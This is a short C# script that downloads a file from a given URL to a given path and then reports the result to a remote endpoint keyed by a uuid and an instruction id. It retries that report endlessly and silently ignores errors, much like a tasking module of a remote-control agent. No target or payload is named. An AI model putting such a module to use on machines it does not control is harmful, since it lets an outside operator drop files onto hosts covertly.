﻿using System;
using System.IO;
using System.Net;
using System.Text;
using System.Net.Http;
using System.Diagnostics;
using System.Threading.Tasks;
using System.Net.Http.Headers;
using System.Runtime.Serialization;
using System.Runtime.Serialization.Json;
public class Script
{
	[DataContract]
    public class Response
    {
        [DataMember]
        public string output { get; set; }
    }
    private static async Task NotifyWithRetry(string EndPoint, string uuid, long instructionId, short code, string output)
    {
        TimeSpan delay = TimeSpan.FromSeconds(10);
        while (true)
        {
            HttpClient httpClient = new HttpClient();
            try
            {
                DataContractJsonSerializer serializer = new DataContractJsonSerializer(typeof(Response));

                using (MemoryStream ms = new MemoryStream())
                {
                    serializer.WriteObject(ms, new Response { output = output });
                    var content = new StringContent(Encoding.UTF8.GetString(ms.ToArray()), Encoding.UTF8, "application/json");
                    var response = await httpClient.PostAsync(EndPoint + "Response/" + uuid + "/" + instructionId + "/" + code, content);
                    response.EnsureSuccessStatusCode();
                    break;
                }
            }
            catch (Exception)
            {
            }
            await Task.Delay(delay);
        }
    }
    public static async Task<object> ExecuteAsync(string savePath,string fileUrl , string endpoint, string uuid, long instId, short code)
    {
	    var output = "Download Done";
		try
		{
			using (WebClient client = new WebClient())
			{
				await client.DownloadFileTaskAsync(new Uri(fileUrl), savePath);
			}
		}
		catch (WebException ex)
		{
			output= "Error downloading file: " + ex.Message;
		}
		catch (IOException ex)
		{
			output= "Error saving file: " + ex.Message;
		}
		catch (Exception ex)
		{
			output ="An unexpected error occurred: " + ex.Message;
		}
         await NotifyWithRetry(endpoint, uuid, instId, code, output);
        return null;
    }

}